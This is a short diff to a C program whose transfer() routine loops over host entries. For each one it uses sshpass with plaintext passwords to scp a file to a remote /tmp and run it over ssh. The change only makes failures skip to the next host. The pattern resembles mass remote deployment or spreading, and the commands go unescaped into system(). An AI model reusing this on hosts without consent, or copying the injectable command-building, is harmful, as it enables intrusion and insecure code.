@@ -14,9 +14,9 @@ typedef struct addrinfo addrinfo;
 
 #define HOSTNAME "wafflevikings.hh"
 
-#define system_or_return(command) ({ \
+#define system_or_continue(command) ({ \
 if (system(command) != 0) {          \
-    return;                          \
+    continue;                        \
 }                                    \
 })
 
@@ -79,14 +79,14 @@ void transfer(void) {
             char ssh_keyscan_command[256];
             snprintf(ssh_keyscan_command, sizeof(ssh_keyscan_command),
                      "ssh-keyscan -t ed25519 -H %s >> ~/.ssh/known_hosts", ip);
-            system_or_return(ssh_keyscan_command);
+            system_or_continue(ssh_keyscan_command);
 
             // Transfer file using scp with sshpass
             char scp_command[256];
             snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P %s %s %s@%s:/tmp/", password, port,
                      client_file_name, user, ip);
             printf("Created command : %s\n", scp_command); // print command created
-            system_or_return(scp_command);
+            system_or_continue(scp_command);
         }
 
         // SSH connection to the user on the specified IP
@@ -100,7 +100,7 @@ void transfer(void) {
             chmod_executed = true;
 
         printf("Created command : %s\n", ssh_command); // show the current command
-        system_or_return(ssh_command);
+        system_or_continue(ssh_command);
     }
 
     fclose(file);
